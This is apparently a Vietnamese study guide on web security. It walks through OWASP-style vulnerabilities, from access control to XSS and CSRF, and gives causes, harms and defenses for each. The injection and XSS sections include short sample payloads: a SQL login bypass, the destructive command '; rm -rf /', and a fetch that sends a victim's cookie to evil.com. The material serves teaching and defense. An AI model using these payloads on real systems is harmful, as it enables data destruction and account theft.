# 1. ⚔️ Giới thiệu Bảo mật Website
## ✅ 1. Bảo mật website là gì?
  - Là quá trình phòng ngừa, phát hiện và ngăn chặn tấn công mạng vào website.
  - Mục tiêu: giữ website luôn ổn định và an toàn, tránh bị hacker tấn công.
  - Bao gồm: đảm bảo dữ liệu không bị rò rỉ, website không bị lợi dụng, và hệ thống luôn sẵn sàng hoạt động.
- ➡️ Nó là một quá trình liên tục, không phải làm một lần rồi bỏ.

## ✅ 2. Ứng dụng web là gì?
  - Là các chương trình chạy trên trình duyệt (client) và máy chủ (server).
  - Ví dụ: trang bán hàng, mạng xã hội, cổng thông tin.

## ✅ 3. Các vấn đề bảo mật trong ứng dụng web
- **🔹 Phía trình duyệt (Client-side):**
- Hacker có thể giả mạo dữ liệu trên trang web.
- Dữ liệu gửi từ client lên server có thể bị chặn và sửa đổi.
- Thông báo lỗi trả về từ server có thể tiết lộ thông tin về hệ thống → hacker lợi dụng.
- **🔹 Phía server (Server-side):**
- Cấu hình sai hệ điều hành hoặc máy chủ web.
- Phần mềm cũ hoặc có lỗ hổng, dễ bị khai thác.
- Code xử lý không quan tâm đến bảo mật.

- **🔹 Phía mạng (Network):**
- Dữ liệu gửi qua HTTP có thể bị nghe lén hoặc sửa đổi bởi bên thứ ba.
- SSL/TLS giúp mã hóa dữ liệu, nhưng nếu cấu hình sai hoặc không dùng → vẫn bị tấn công.

## ✅ 4. Đánh giá độ an toàn website – 4 bước
| Bước                                 | Giải thích                                                                 |
| ------------------------------------ | -------------------------------------------------------------------------- |
| 1. **Phân loại tài sản**             | Xác định thứ cần bảo vệ (dữ liệu, tài khoản, thông tin khách hàng...)      |
| 2. **Phân tích mối đe dọa**          | Ai có thể tấn công? Bằng cách nào?                                         |
| 3. **Phân tích rủi ro**              | Đánh giá mức độ nguy hiểm: `Nguy cơ = Xác suất x Thiệt hại`                |
| 4. **Thiết kế chương trình an ninh** | Đề ra giải pháp vừa hiệu quả vừa không ảnh hưởng đến hoạt động bình thường |

## ✅ 5. Một số giải pháp bảo mật website
- Quét và gỡ mã độc (malware scan/removal)
- Theo dõi thay đổi tệp tin (file monitoring)
- Giám sát danh sách đen (blacklist monitoring)
- Tường lửa ứng dụng web (Web Application Firewall - WAF)
- Mạng phân phối nội dung (Content Delivery Network - CDN)
- Ngăn chặn tấn công từ chối dịch vụ (DDoS)
- Chứng chỉ an toàn website (Site Seal)


# ⚔️ 2. lỗ hổng bảo mật phổ biến nhất

## 1. 🧱 Broken Access Control 
`tạm dịch: kiểm soát truy cập bị lỗi`
- **Mô tả:** "Broken Access Control" xảy ra khi một ứng dụng không giới hạn quyền truy cập đúng cách, khiến người dùng bình thường làm được những việc mà họ không được phép làm, ví dụ:
  - Truy cập trang quản trị
  - Xem dữ liệu của người khác
  - Sửa hoặc xóa nội dung không thuộc quyền của họ
  - Lợi dụng API hoặc URL để vượt quyền

- **Nguyên Nhân:**
- Vi phạm nguyên tắc đặc quyền tối thiểu và từ chối theo mặc định
  - Quyền tối thiểu: Chỉ cấp quyền tối thiểu cần thiết cho người dùng hoặc hệ thống để thực hiện nhiệm vụ
  - Từ chối mặc định: Mọi quyền truy cập đều bị từ chối theo mặc định, trừ khi được cấp phép rõ ràng cho một người dùng

- **Tác hại:** Người dùng bình thường có thể truy cập chức năng quản trị hoặc dữ liệu người khác.
  - 🔓 Truy cập dữ liệu nhạy cảm	
  - ✏️ Sửa/xóa dữ liệu trái phép
  - 🛡️ Vượt quyền admin
  - 🧨 Làm lộ thông tin hệ thống

- **Cách phòng chống Broken Access Control**
  - ✅ Kiểm tra quyền trên máy chủ
  - 🧱 Gán quyền rõ ràng cho người dùng
  - 🚫 Chặn truy cập ID người khác
  - 🛡️ Giám sát và ghi log truy cập
  - 🔍 Kiểm tra lỗ hổng định kỳ
  - Không tin tưởng dữ liệu client
  - Dùng ID khó đoán: UUID, hash ID, token thay cho số thứ tự.
  

- **💻 Ví dụ**
  - Giả sử người dùng truy cập:   
  ```
  https://example.com/profile?user_id=1001
  ```
  - Sau đó
  ```
  https://example.com/profile?user_id=1002
  ```


## 2. 🧨 Cryptographic Failures
`tạm dịch: lỗi mã hóa`
- **Mô tả:** "Cryptographic Failures" xảy ra khi `dữ liệu nhạy cảm không được mã hóa đúng cách, hoặc sử dụng thuật toán mã hóa yếu hoặc không mã hóa`, dẫn đến việc hacker có thể nghe lén, đọc trộm, giả mạo hoặc sửa đổi dữ liệu.
- **Phân Loại**
- Thuật toán yếu hoặc cấu hình sai
- Không mã hóa dữ liệu nhạy cảm
- Quản lý khóa mã hóa kém
- Thiếu xác thực tính toàn vẹn

- **Tác hại:** Dữ liệu nhạy cảm bị lộ, dẫn đến mất mát thông tin, thiệt hại tài chính, hoặc vi phạm quy định pháp luật.

- **Cách phòng chống Cryptographic Failures**
  - ✅ Sử dụng thuật toán mã hóa mạnh (VD: AES-256)
  - 🔑 Quản lý khóa mã hóa an toàn
  - 🔍 Kiểm tra và cập nhật định kỳ các thư viện mã hóa

- **💻 Ví dụ**
  - Lưu trữ mật khẩu người dùng dưới dạng văn bản thuần túy thay vì mã hóa.
  - Không sử dụng HTTPS để bảo vệ dữ liệu truyền tải giữa client và server.




## 3. Injection Attacks (Tấn công chèn mã)
- **Mô tả:** Ứng dụng cho phép dữ liệu do người dùng nhập vào được đưa vào câu lệnh hoặc truy vấn (ví dụ: truy vấn SQL, lệnh hệ điều hành, lệnh LDAP, v.v.) mà không kiểm soát đúng cách.

- **Tác hại:** Kẻ tấn công có thể chèn mã độc vào đầu vào người dùng để thao túng truy vấn cơ sở dữ liệu, thực thi lệnh hệ thống hoặc lấy dữ liệu nhạy cảm.

- **Nguyên nhân:** Không lọc hoặc kiểm tra đầu vào người dùng đúng cách.

- **Ví dụ:** 
  - SQL Injection       :Chèn mã vào truy vấn SQL `OR '1'='1`
  - Command Injection   :Chèn mã vào lệnh hệ điều hành `; rm -rf /`
  - LDAP Injection(Lightweight Directory Access Protocol)      :Chèn mã vào truy vấn LDAP
  - XPath Injection     :Chèn mã vào truy vấn XPath
  - XXE Injection (XML External Entity) :cho phép kẻ tấn công chèn DTD độc hại với external entity để khai thác lỗ hỏng của ứng dụng web. 
  - OS Command Injection (hay shell injection): là lỗ hổng cho phép kẻ tấn công thực thi các lệnh hệ điều hành trên máy chủ thông qua ứng dụng web với cấp quyền của ứng dụng đó.
  
- Đoạn code web không an toàn:

```sql
# Dữ liệu từ form nhập vào:
username = request.GET['username']
password = request.GET['password']

# Câu truy vấn sai cách:
sql = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
```
- Nếu hacker nhập:
  - Username: admin' --
  - Password: (bỏ trống)
    → Câu truy vấn sẽ trở thành:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
```

## 4. 🧠 Insecure Design
- **🧩 Mô tả:** thiết kế hệ thống, chức năng hoặc luồng xử lý không tính đến bảo mật ngay từ đầu, khiến ứng dụng dễ bị tấn công dù code không sai về kỹ thuật.

- **🧩 Nói cách khác:** Dù bạn code đúng, không có bug kỹ thuật (như SQLi, XSS…), nhưng nếu cách bạn thiết kế logic, chức năng, hoặc quy trình không có yếu tố bảo mật, thì vẫn bị tấn công.

- `Không phải lỗi code, mà là lỗi tư duy thiết kế.`

- **Nguyên Nhân:**
- THIẾU TƯ DUY “SECURITY BY DESIGN”
  - Không phân tích rõ các mối đe doạ
  - Không áp dụng nguyên tắc ”Security by Design”
    - Least Privilege
    - Fail-safe default
    - Defense in depth
- KHÔNG MÔ HÌNH HOÁ MỐI ĐE DOẠ: Không mô phỏng nguy cơ tấn công trong quá trình phân tích và thiết kế
- ÁP LỰC NĂNG SUẤT
  - Ưu tiên xây dựng chức năng sáng tạo
  - Các yếu tố bảo mật bị xem nhẹ
  - Thời gian gấp rút
  - Vấn đề tài chính

- **🔥 Ví dụ dễ hiểu về Insecure Design**
  1. ❌ Không có giới hạn số lần đăng nhập
  - Thiết kế form đăng nhập mà không giới hạn số lần thử → dễ bị brute-force.
  
  1. ❌ Cho phép người dùng đổi email mà không xác thực lại
  - Người lạ chiếm quyền tài khoản chỉ bằng cách đổi email → chiếm quyền.
  
  1. ❌ Không có xác thực 2 lớp (2FA) với chức năng quan trọng
  - Thiết kế tài khoản ngân hàng mà không yêu cầu OTP khi rút tiền → rủi ro cao.
  
  1. ❌ Dùng ID để truy cập dữ liệu, nhưng không kiểm tra quyền
  - Truy cập URL như /invoice/1002 → xem được hóa đơn người khác.

→ Những cái này không phải lỗi code mà là lỗi thiết kế – hệ thống được "xây" mà không nghĩ đến bảo mật.

- **🎯 Tác hại của Insecure Design**
- 🔓 Vượt quyền, chiếm quyền	: Vì không có kiểm soát logic đúng
- 🧨 Khó vá lỗi	: 	Vì lỗi nằm trong ý tưởng thiết kế, không phải chỉ code
- 🐍 Hacker khai thác hành vi hợp lệ	: Không cần khai thác lỗi kỹ thuật mà chỉ lợi dụng "lỗi tư duy"
- 🏗 Ảnh hưởng cả hệ thống :	Vì sai ngay từ nền tảng ban đầu

- **🛡️ Cách phòng chống Insecure Design**
- 🧠 Thiết kế bảo mật ngay từ đầu
- 🔍 Phân tích các tình huống tấn công có thể xảy ra trong từng chức năng
- 📝 Thiết kế từng chức năng theo tiêu chuẩn an toàn (ví dụ: có giới hạn, có kiểm quyền, xác thực...)
- Không chỉ xem code mà còn xem logic thiết kế

## 5. Security Misconfiguration
- **Mô tả:** Cấu hình không đúng hoặc không an toàn như:
  1. ❌ Bật debug mode trên môi trường production
  - Hacker thấy thông báo lỗi chi tiết → biết được cấu trúc hệ thống → dễ tấn công.

  2. ❌ Dùng tài khoản admin mặc định
  - Username: admin / Password: admin123 → hacker đăng nhập được.

  3. ❌ Không tắt chức năng không dùng đến
  - Ví dụ: bật FTP, SSH, phpMyAdmin công khai trên Internet → bị khai thác.

  4. ❌ Thư mục nhạy cảm không bị cấm truy cập
  - Ví dụ: http://site.com/.git/ → hacker truy cập được mã nguồn.

  5. ❌ Không cập nhật phần mềm, thư viện
  - Sử dụng phiên bản cũ chứa lỗ hổng → dễ bị khai thác qua CVE.

  6. ❌ Sai cấu hình quyền truy cập
  - File log hoặc cấu hình mở public → lộ thông tin hệ thống, API key, mật khẩu,...
  7. ❌ Headers bảo mật thiếu hoặc sai cấu hình
  - Ví dụ: thiếu X-Content-Type-Options, X-Frame-Options, X-XSS-Protection → dễ bị tấn công.

- **Tác hại:** 
  - 🔍 Lộ thông tin nhạy cảm
  - 🔓 Mở cửa cho tấn công	
  - 📉 Mất niềm tin người dùng	
  - 💸 Tổn thất tài chính	

- **Cách phòng chống:**
  - ✅ Tắt debug, verbose logs	
  - ✅ Đổi mật khẩu mặc định	
  - ✅ Vô hiệu hóa dịch vụ không dùng	
  - ✅ Cấu hình tường lửa, quyền truy cập	
  - ✅ Cập nhật thường xuyên	
  - ✅ Kiểm tra bảo mật định kỳ	

## 6. Vulnerable and Outdated Components
- **Mô tả:** Đây là lỗi xảy ra khi ứng dụng web sử dụng thư viện, framework, phần mềm hoặc plugin cũ chứa lỗ hổng bảo mật đã được phát hiện nhưng chưa cập nhật hoặc thay thế.

- **📦 Ví dụ**
- Sử dụng phiên bản cũ của thư viện jQuery, React, hoặc các plugin WordPress có lỗ hổng bảo mật đã biết.
- Sử dụng phần mềm máy chủ web (như Apache, Nginx) hoặc cơ sở dữ liệu (như MySQL, MongoDB) không được cập nhật. 

- **💣 Tác hại của lỗi này**
- 💥 Bị tấn công từ xa (RCE, XSS, SQLi...)
- 🔓 Lộ dữ liệu người dùng hoặc toàn bộ hệ thống
- 🧨 Chiếm quyền điều khiển server
- 📉 Ảnh hưởng đến uy tín và pháp lý (nếu lộ dữ liệu người dùng)

- **🔍 Vì sao lại dễ bị lỗi này?**
- Lập trình viên quên cập nhật thư viện
- Sợ cập nhật làm hỏng hệ thống đang hoạt động
- Thiếu kiểm tra định kỳ về các thành phần phần mềm đang dùng

- **Cách phòng chống:**
  - ✅ Sử dụng công cụ quét lỗ hổng (VD: OWASP Dependency-Check, Snyk)
  - ✅ Cập nhật định kỳ các thư viện, framework
  - ✅ Theo dõi thông báo bảo mật từ nhà cung cấp
  - ✅ Thực hiện kiểm tra bảo mật định kỳ
  - ✅ Kiểm tra CVE
  - ✅ Sử dụng nguồn tin cậy

## 7. Authentication and Identification
`Định danh và xác thực`
- **Mô tả:** Lỗi xác thực và nhận dạng xảy ra khi ứng dụng không quản lý phiên đăng nhập hoặc xác thực người dùng đúng cách hoặc bỏ qua, dẫn đến việc kẻ tấn công có thể chiếm quyền truy cập tài khoản người dùng.

- **Nguyên Nhân:**
- Unlimited Login Attempts -Không giới hạn số lần đăng nhập
- Missing Multi-Factor Authentication Thiếu Xác Thực Đa Yếu Tố
- Session Management VulnerabilitiesLỗ hổng quản lý phiên 
- JWT Algorithm Confusion – Nhầm Lẫn Giải Thuật JWT


- **Tác hại:** Kẻ tấn công có thể đăng nhập vào tài khoản người dùng mà không cần mật khẩu, hoặc sử dụng các phương pháp tấn công như brute force để đoán mật khẩu.

- **🔁 3. Quy trình chuẩn:**
- Identification: Tôi là lehaidang
- Authentication: Đây là mật khẩu của tôi ********
- Authorized: Bạn đã được xác minh → Truy cập thành công

- **Các phương pháp Authentication**
-  Mật khẩu (Password)
-  OTP
-  Token vật lý
-  Sinh trắc học
-  Đăng nhập qua google fb...
-  MFA: xác thực đa yếu tố
- **Cách kết hợp với phân quyền**

## 9. Security Logging and Monitoring Failures
- **Mô tả:** Lỗi này xảy ra khi ứng dụng không ghi lại đầy đủ thông tin về các hoạt động quan trọng, không phát hiện được các hành vi xâm nhập hoặc tấn công.

- **Một số lỗi phổ biến:**
  - Không ghi lại các sự kiện bảo mật quan trọng
  - Không giám sát log
  - Không lưu trữ nhật ký đủ lâu
  - File log không an toàn: không được bảo vệ đúng cách

- **Tác hại:** 
  - Tấn công xảy ra mà không ai biết,
  - Không phát hiện sớm, không cảnh báo,
  - Không có dữ liệu để điều tra hoặc phản ứng sự cố.

- **Ví dụ:** 
- Tình huống:
  - Hacker cố tình đoán mật khẩu sai 100 lần trên tài khoản admin.
  - 🔸 Nếu hệ thống KHÔNG ghi lại log đăng nhập sai, KHÔNG cảnh báo admin, thì:
  - Không ai biết đang bị brute-force.
  - Hacker có thời gian thử đến khi thành công.
  - ⚠️ Nếu hệ thống có log, ta sẽ thấy:

```pgsql
[SECURITY WARNING] 2025-08-08 10:30 – Login failed – admin – IP: 192.168.1.99
```
- **📊 Tại sao quan trọng?**
  - 🛡️ Log là mắt và tai của hệ thống.
  - 🔍 Không có log = mù thông tin → không phát hiện được tấn công.
  - 🧑‍💻 Không có log = không điều tra được sau khi bị hack.
  - 🚨 Không có cảnh báo = không phản ứng kịp thời.

- **✅ Cách khắc phục và cải thiện**
- ✅ Ghi log đầy đủ các sự kiện quan trọng (đăng nhập, thay đổi dữ liệu, truy cập API...)
- ✅ Thiết lập cảnh báo khi có hành vi bất thường (như đăng nhập sai quá nhiều lần, truy cập từ IP lạ...)
- ✅ Sử dụng hệ thống SIEM để phân tích và phát hiện xâm nhập.
- ✅ Kiểm tra log thường xuyên	
- ✅ Bảo vệ log an toàn: không để lộ ra ngoài, không cho phép sửa đổi log hoặc leo thang đặc quyền.

## 10.  Server-Side Request Forgery(SSRF)
`Giả mạo yêu cầu phía máy chủ`
- **Mô tả:** xảy ra khi hacker điều khiển server gửi yêu cầu HTTP đến một địa chỉ do hắn chọn.
- ➡️ Tấn công không gửi trực tiếp từ trình duyệt hacker → mà từ chính server của web app.

- **🧠 Cách hiểu đơn giản**
  - Bình thường: Client gửi yêu cầu đến server → server xử lý → trả kết quả.
  - Với SSRF: Hacker lợi dụng server, ép nó gửi yêu cầu đến nơi khác, ví dụ như:
    - Gửi yêu cầu đến nội bộ (localhost, 127.0.0.1)
    - Truy cập dịch vụ nội bộ (như AWS metadata, Redis, Admin Panel)
    - Quét port nội bộ
    - Tấn công server khác qua server này

- **Tác hại:**
- 🏠 Truy cập dịch vụ nội bộ
- 🔍 Quét port nội bộ
- 🎯 Dùng server làm proxy tấn công	
- 🔐 Truy cập hệ thống khác từ cloud: bypass firewall, acl
- 🧠 Truy vấn metadata dịch vụ cloud	
- 🔍 Khai thác kết hợp với RCE, File Read, LFI...

- **🛡️ Cách phòng chống SSRF**
- ✅ Chặn URL nội bộ (localhost, 127.0.0.1)	
- ✅ Kiểm tra định dạng URL đầu vào	
- ✅ Dùng whitelist domain	
- ✅ Không trả trực tiếp nội dung request	
- ✅ Giới hạn chức năng request trong server	
- ✅ Sử dụng proxy outbound có kiểm soát	


## 11. Cross-Site Scripting (XSS)
- **Mô tả:** là lỗ hổng cho phép kẻ tấn công chèn mã độc (thường là JavaScript) vào trang web và thực thi trên trình duyệt của người dùng.

- **Tác hại:** ➡️ Kẻ tấn công lừa trình duyệt chạy mã do hắn viết, dẫn đến:
- Đánh cắp cookie (session)
- Giả mạo hành vi người dùng
- Tải mã độc, chuyển hướng người dùng
- Chiếm quyền tài khoản
- Đánh cắp thông tin phiên (Session Hijacking)
- Lừa đảo và giả mạo giao diện (Phishing)
- Tấn công vào ứng dụng quản trị


- **💥 Ví dụ đơn giản**
- Người dùng nhập bình luận:
```html
<script>alert('Bạn bị XSS!');</script>
```
- JavaScript được thực thi trên trình duyệt người khác
- **🧨 Hậu quả**
- document.cookie                   :	Đánh cắp phiên đăng nhập
- fetch('http://evil.com?c='+cookie):	Gửi cookie về server của hacker
- document.location = 'http://evil.com':	Chuyển hướng người dùng
- keylogger                         :	Ghi lại phím người dùng gõ
- Tải mã độc                        :	Kết hợp tấn công nâng cao hơn (phishing, RCE)

- **Phân loại:**
  - **XSS lưu trữ (Stored):** Mã độc được lưu trữ trên máy chủ và gửi đến người dùng khi họ truy cập trang.
  - **XSS phản hồi (Reflected):** Mã độc được chèn vào URL và phản hồi ngay lập tức, không lưu trữ.
  - **XSS DOM-Based(Document object Model):** Mã độc thay đổi cấu trúc DOM của trang web mà không cần tương tác với máy chủ.

- **Tác hại:** Đánh cắp cookies, điều khiển tài khoản người dùng, thực hiện hành vi giả mạo.

- **Cách phòng chống:**
  - ✅ Lọc và mã hóa đầu vào người dùng
  - ✅ Sử dụng CSP (Content Security Policy): Hạn chế nguồn script được thực thi
  - ✅ Tránh sử dụng eval() hoặc các hàm tương tự
  - ✅ Kiểm tra và cập nhật thư viện thường xuyên

## 12. Cross-Site Request Forgery (CSRF)
- **Mô tả:** là kiểu tấn công khiến nạn nhân (đã đăng nhập) vô tình thực hiện hành động (chuyển tiền, đổi mật khẩu, xóa tài khoản...) mà họ không hề biết, nhưng hành động đó lại được gửi từ trình duyệt của họ với quyền hợp pháp.
- ➡️ Nói cách khác: Kẻ tấn công lừa trình duyệt của nạn nhân gửi yêu cầu đến website khác, nơi mà nạn nhân đã đăng nhập.

- **🎯 Hậu quả của CSRF**

| Hành động giả mạo                 | Tác hại có thể gây ra            |
| --------------------------------- | -------------------------------- |
| Đổi địa chỉ email/số điện thoại   | Chiếm quyền tài khoản            |
| Gửi tin nhắn / bài viết           | Lợi dụng nạn nhân spam / lừa đảo |
| Thay đổi mật khẩu / thông tin     | Mất kiểm soát tài khoản          |
| Thực hiện giao dịch (chuyển tiền) | Mất tài sản                      |

- **⚠️ Điều kiện xảy ra CSRF**
- Người dùng đã đăng nhập vào hệ thống
- Web không xác minh nguồn gốc request
- Trình duyệt tự gửi cookie/session tự động
- **🛡️ Cách phòng chống CSRF**

| Biện pháp| Mục đích |
| -------------------------- | ---------------------------------------- |
| ✅ **Sử dụng CSRF Token**| Mỗi request gửi form có một mã token duy nhất, xác minh người gửi là thật |
| ✅ **Xác minh HTTP Referer / Origin**| Chỉ chấp nhận request từ trang chính chủ |
| ✅ **Không dùng GET cho hành động quan trọng**| GET nên chỉ dùng để đọc dữ liệu |
| ✅ **Sử dụng SameSite Cookie**| Giới hạn cookie chỉ gửi khi cùng domain |
| ✅ **Yêu cầu xác thực lại (password)** cho các hành động nhạy cảm| Ngăn bot giả mạo tự động thực hiện |

